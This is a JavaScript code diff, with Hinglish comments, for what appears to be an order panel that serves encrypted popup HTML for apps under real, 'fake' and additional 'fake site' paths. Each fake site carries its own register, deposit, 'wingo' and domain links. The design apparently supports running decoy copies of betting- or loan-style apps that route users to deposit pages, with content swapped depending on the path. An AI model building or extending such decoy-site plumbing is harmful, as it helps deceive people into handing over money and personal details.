@@ -33,7 +33,8 @@ function normalizePathKey(value) {
   return p;
 }
 
-// Order dhundo — real ya fake firebase path dono se match
+// Order dhundo — real, primary fake, ya EXTRA fake site (order_fake_sites)
+// path — teeno me se kisi bhi path pe content serve hota hai.
 function findOrderByPath(pathKey) {
   const p = normalizePathKey(pathKey);
   if (!p) return null;
@@ -43,9 +44,26 @@ function findOrderByPath(pathKey) {
     WHERE lower(o.firebase_path) = lower(?) OR lower(o.fake_firebase_path) = lower(?)
     ORDER BY o.id DESC LIMIT 1
   `).get(p, p);
-  if (!row) return null;
-  const isFake = row.fake_firebase_path && String(row.fake_firebase_path).toLowerCase() === p.toLowerCase();
-  return { row, isFake };
+  if (row) {
+    const isFake = row.fake_firebase_path && String(row.fake_firebase_path).toLowerCase() === p.toLowerCase();
+    return { row, isFake };
+  }
+  // Extra fake site ka path?
+  const fs = db.prepare(`
+    SELECT o.*, d.popup_html_file, d.fake_popup_html_file, d.java_type, d.category,
+           f.register_url  AS fs_register_url,
+           f.firebase_path AS fs_firebase_path,
+           f.deposit_url   AS fs_deposit_url,
+           f.wingo_url     AS fs_wingo_url,
+           f.domain        AS fs_domain
+    FROM order_fake_sites f
+    JOIN orders o  ON o.id = f.order_id
+    JOIN designs d ON d.id = o.design_id
+    WHERE lower(f.firebase_path) = lower(?)
+    ORDER BY f.id DESC LIMIT 1
+  `).get(p);
+  if (!fs) return null;
+  return { row: fs, isFake: true, fakeSite: fs };
 }
 
 async function encryptToBuffer(html) {
@@ -61,13 +79,33 @@ async function encryptToBuffer(html) {
   }
 }
 
-function buildParams(orderRow, designRow, isFake) {
-  const registerUrl = isFake ? orderRow.fake_register_url : orderRow.register_url;
+function buildParams(orderRow, designRow, isFake, fakeSite) {
+  // Extra fake site (order_fake_sites) ho to uske apne links/path use karo
+  let registerUrl, firebasePath, depositUrl, wingoUrl, domain;
+  if (fakeSite && fakeSite.fs_register_url) {
+    registerUrl = fakeSite.fs_register_url;
+    firebasePath = fakeSite.fs_firebase_path;
+    depositUrl = fakeSite.fs_deposit_url;
+    wingoUrl = fakeSite.fs_wingo_url;
+    domain = fakeSite.fs_domain;
+    if (!depositUrl || !wingoUrl || !domain) {
+      const isDhani2 = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
+      const urls2 = buildUrls(registerUrl, isDhani2);
+      depositUrl = depositUrl || urls2.deposit;
+      wingoUrl = wingoUrl || urls2.wingo;
+      domain = domain || extractDomain(registerUrl);
+    }
+  } else {
+    registerUrl = isFake ? orderRow.fake_register_url : orderRow.register_url;
+    firebasePath = isFake ? orderRow.fake_firebase_path : orderRow.firebase_path;
+    const isDhani3 = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
+    const urls3 = buildUrls(registerUrl, isDhani3);
+    depositUrl = urls3.deposit;
+    wingoUrl = urls3.wingo;
+    domain = extractDomain(registerUrl);
+  }
   if (!registerUrl) return null;
   const isDhani = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
-  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(registerUrl, isDhani);
-  const domain = extractDomain(registerUrl);
-  const firebasePath = isFake ? orderRow.fake_firebase_path : orderRow.firebase_path;
   let appIconBase64 = null;
   if (orderRow.icon_file) {
     const iconPath = path.join(UPLOADS_DIR, orderRow.icon_file);
@@ -93,14 +131,14 @@ async function buildAppContent(pathKey, kind = 'popup') {
   try {
     const found = findOrderByPath(pathKey);
     if (!found) return null;
-    const { row, isFake } = found;
+    const { row, isFake, fakeSite } = found;
     const design = {
       popup_html_file: row.popup_html_file,
       fake_popup_html_file: row.fake_popup_html_file,
       java_type: row.java_type,
       category: row.category
     };
-    const params = buildParams(row, design, isFake);
+    const params = buildParams(row, design, isFake, fakeSite);
     if (!params) return null;
 
     let html;
